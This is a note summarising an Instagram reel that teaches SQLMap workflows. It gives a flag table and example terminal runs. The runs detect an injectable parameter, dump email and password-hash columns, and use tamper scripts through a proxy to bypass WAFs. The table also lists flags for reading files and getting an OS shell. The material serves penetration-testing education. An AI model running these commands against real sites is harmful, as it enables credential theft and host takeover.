# 04 — SQLMap: 7 Workflows for SQL Injection Exploitation

- **Source:** Instagram reel — https://www.instagram.com/reel/DXRd4EmjNYR/
- **Author:** [@kerem.tech](https://instagram.com/kerem.tech)
- **Shared:** 2026-04-18
- **Duration:** 7s
- **GitHub repos:** none directly (SQLMap canonical repo below)
- **External links:** none

## Caption

SQL injection has been in OWASP's top risks for over 20 years. SQLMap is still the tool that automates almost every step of exploiting it.

One workflow:

- Detect vulnerable parameters with a single command
- Enumerate every database, table, and column
- Dump real rows from specific columns, not entire tables
- Replay full POST requests with cookies and headers intact
- Crank level and risk to surface hidden injection points
- Bypass WAFs with tamper scripts
- Escalate a DB bug into an OS shell on the host

> Only use SQLMap on targets you own or have explicit permission to test.

`#sqlmap #sqlinjection #pentesting #bugbounty #cybersecurity`

## Audio transcript

Music only — no spoken content.

## On-screen flag reference (OCR)

| Flag | Purpose |
|------|---------|
| `-u` | Target URL with at least one GET parameter |
| (default) | Runs heuristic + injection tests on every parameter |
| `--columns` | List columns for that table |
| `--dump` | Extract row data from the table |
| `--dump-all` | Dump every table of every database (loud) |
| `-C email,password --dump` | Dump only specific columns |
| `-D shop_prod -T users` | Target a specific DB + table |
| `--file-read` | Read arbitrary files from the DB server |
| `--os-shell` | Drop into an interactive OS shell via the DB |
| `--sql-shell` | Run raw SQL queries interactively |
| `--tamper=space2comment,between` | Chain obfuscation scripts to bypass WAFs |
| `--proxy=http://127.0.0.1:8080` | Route through Burp / SOCKS / HTTP proxy |
| `--random-agent` | Rotate a real browser User-Agent per run |

Example walkthrough recovered from OCR:

```
$ sqlmap -u "http://target.com/item?id=1"
[INFO] testing connection to the target
[INFO] testing if GET parameter 'id' is dynamic
[INFO] heuristic test shows 'id' might be injectable
[INFO] testing for SQL injection on GET param 'id'
[INFO] GET parameter 'id' is vulnerable.

$ sqlmap -u "http://target.com/item?id=1" \
    -D shop_prod -T users \
    -C email,password --dump
[INFO] fetching columns for table 'users' in 'shop_prod'
[INFO] fetching entries of column(s) 'email, password'

| email             | password               |
| admin@shop.local  | $2y$10$X09...r8a (admin) |
| jane@shop.local   | $2y$10$Kq2...wlp       |
| bob@shop.local    | $2y$10$Lm4...t3z       |
```

Tamper-script + proxy run:

```
sqlmap -u "..." \
  --random-agent --proxy=http://127.0.0.1:8080 \
  --tamper=space2comment,between
[INFO] setting random HTTP User-Agent header
[INFO] routing traffic via 127.0.0.1:8080
[INFO] loading tamper scripts: space2comment, between
[INFO] going to upload the file stager
[INFO] the file stager has been successfully uploaded
```

## Canonical repo (reference)

- SQLMap — https://github.com/sqlmapproject/sqlmap

## Tools / keywords

SQLMap · OWASP · DBMS fingerprinting · tamper scripts · WAF bypass · `--os-shell` · Burp proxy chaining
